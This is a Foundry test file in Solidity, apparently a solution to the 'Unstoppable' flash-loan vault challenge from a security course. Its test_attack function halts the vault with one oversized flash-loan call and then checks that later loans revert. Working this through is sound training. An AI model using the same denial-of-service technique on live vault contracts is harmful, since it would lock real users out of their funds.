// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "week8-9-security/unstoppable/UnstoppableVault.sol";
import "week8-9-security/unstoppable/ReceiverUnstoppable.sol";
import "week8-9-security/unstoppable/DamnValuableToken.sol";

contract UnstoppableVaultTest is Test {
    DamnValuableToken token;
    UnstoppableVault vault;
    ReceiverUnstoppable receiver;

    uint256 constant TOKENS_IN_VAULT = 1_000_000e18;
    uint256 constant TOKENS_FOR_PLAYER = 10e18;

    function setUp() external {
        token = new DamnValuableToken();
        vault = new UnstoppableVault(
            ERC20(token),
            address(this),
            address(this)
        );
        receiver = new ReceiverUnstoppable(address(vault));

        // Set up initial vault
        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, address(this));

        // Set up player
        token.transfer(address(receiver), TOKENS_FOR_PLAYER);
    }

    function test_setUp() external {
        assertEq(address(vault.asset()), address(token));
        assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
        assertEq(vault.maxFlashLoan(address(token)), TOKENS_IN_VAULT);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT - 1), 0);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT), 50_000e18);
        assertEq(token.balanceOf(address(receiver)), TOKENS_FOR_PLAYER);

        // Should be able to execute a flash loan without reverting
        receiver.executeFlashLoan(100e18);
    }

    function test_attack() external {
        // Does not halt contract
        // receiver.executeFlashLoan(4_999_999e17);

        // Does halt contract
        receiver.executeFlashLoan(5_000_000e17);

        _isCompleted();
    }

    function _isCompleted() internal {
        vm.expectRevert();
        receiver.executeFlashLoan(100e18);
    }
}
